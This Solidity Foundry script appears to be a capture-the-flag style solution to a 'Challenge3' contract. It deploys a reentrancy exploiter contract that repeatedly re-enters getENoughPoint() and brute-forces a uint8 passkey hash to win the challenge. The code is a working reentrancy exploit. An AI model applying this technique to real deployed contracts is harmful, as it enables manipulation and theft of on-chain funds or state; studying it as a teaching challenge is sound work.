// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/Challenge3.sol";

/**
 * @title Exploiter Contract
 * @notice This contract exploits the reentrancy vulnerability in ChallengeTwo.getENoughPoint()
 *
 * Attack Flow:
 * 1. Call exploit() which calls challenge.getENoughPoint()
 * 2. Inside getENoughPoint(), msg.sender.call("") triggers our fallback
 * 3. Our fallback calls getENoughPoint() again (reentrancy)
 * 4. This chain repeats allowing us to increment userPoint 4 times in one transaction
 */
contract ReentrancyExploiter {
    ChallengeTwo public challenge;
    uint256 public callCount;
    string public targetName;

    constructor(ChallengeTwo _challenge) {
        challenge = _challenge;
    }

    /**
     * @notice Fallback/Receive function triggered by msg.sender.call("")
     * Allows reentering getENoughPoint() to increment userPoint multiple times
     */
    receive() external payable {
        // Increment counter to prevent infinite loops
        callCount++;

        // Keep reentering getENoughPoint until we reach 4 points
        if (callCount < 4) {
            challenge.getENoughPoint(targetName);
        }
    }

    /**
     * @notice Initiates the reentrancy attack
     * @param _targetName The name to be set once we accumulate 4 points
     */
    function exploit(string memory _targetName) public {
        targetName = _targetName;
        callCount = 0;

        // This call will trigger our receive() function via reentrancy
        challenge.getENoughPoint(_targetName);
    }
}

/**
 * @title Challenge3 Solver Script
 * @notice Solves the Challenge3 contract by:
 * 1. Finding the correct passKey
 * 2. Executing a reentrancy attack to accumulate 4 points
 * 3. Adding the attacker to the champions array
 */
contract Challenge3Solver is Script {
    // Target hash that the key must match when keccak256 encoded
    bytes32 constant PASSKEY_HASH =
        0x98a476f1687bc3d60a2da2adbcba2c46958e61fa2fb4042cd7bc5816a710195b;

    /**
     * @notice Brute force search for the correct passkey
     * Since it's a uint8, we only need to check 0-255
     * @return correctKey The key that produces the target hash
     */
    function findPassKey() public pure returns (uint8 correctKey) {
        for (uint256 i = 0; i < 256; i++) {
            uint8 testKey = uint8(i);
            // Mimic Solidity's abi.encode behavior
            if (keccak256(abi.encode(testKey)) == PASSKEY_HASH) {
                correctKey = testKey;
                return correctKey;
            }
        }
        revert("Passkey not found in range 0-255");
    }

    /**
     * @notice Main execution function
     * Runs the complete attack sequence against the Challenge3 contract
     */
    function run() public {
        // Get the private key from environment
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Get the Challenge contract address from environment or deploy new one
        address challengeAddr = 0x0E33589278B45fB9999F7E1C384b74425e33333B;
        ChallengeTwo challenge = ChallengeTwo(challengeAddr);

        console.log("\n========== Challenge3 Exploit Script ==========\n");

        // Step 1: Find and use the passkey
        console.log("Step 1: Finding and using passkey...");
        uint8 correctKey = findPassKey();
        console.log("  -> Found passkey:", uint256(correctKey));

        challenge.passKey(correctKey);
        console.log("  -> Called passKey() successfully");
        console.log("  -> hasSolved1[tx.origin] is now true\n");

        // Step 2: Create the reentrancy exploiter
        console.log("Step 2: Deploying reentrancy exploiter contract...");
        ReentrancyExploiter exploiter = new ReentrancyExploiter(challenge);
        console.log("  -> Exploiter deployed at:", address(exploiter), "\n");

        // Step 3: Execute the reentrancy attack
        console.log(
            "Step 3: Executing reentrancy attack to accumulate 4 points..."
        );
        string memory myName = "AsiwajuOfWeb3";
        exploiter.exploit(myName);
        console.log("  -> Exploit executed successfully");
        console.log("  -> User accumulated 4 points");
        console.log("  -> Name set to:", myName, "\n");

        // Step 4: Add address to champions
        console.log("Step 4: Calling addYourName() to join champions...");
        challenge.addYourName();
        console.log("  -> Successfully added to champions array");
        console.log("  -> Your address:", attacker, "\n");

        // Verification: Get all winners
        string[] memory winners = challenge.getAllwiners();
        console.log("Total champions:", winners.length);
        for (uint256 i = 0; i < winners.length; i++) {
            console.log("  Champion", i + 1, ":", winners[i]);
        }

        console.log("\n========== Challenge3 Exploit Complete! ==========\n");

        vm.stopBroadcast();
    }
}
